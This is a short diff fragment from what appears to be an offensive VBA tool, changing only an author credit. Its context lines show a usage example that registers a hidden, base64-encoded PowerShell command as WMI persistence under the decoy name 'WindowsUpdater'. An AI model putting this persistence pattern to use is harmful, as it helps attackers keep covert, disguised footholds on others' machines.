@@ -15,7 +15,7 @@
 '	WMIPersistence("powershell -noP -sta -w 1 -enc WwBSAGUAZgBdAC4AQQ[...]EUAWAA=", "WindowsUpdater")
 '
 ' AUTHOR: 
-'	Mariusz B. / mgeeky, '17
+'	Mariusz Banach / mgeeky, '17
 '
 
 Public Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
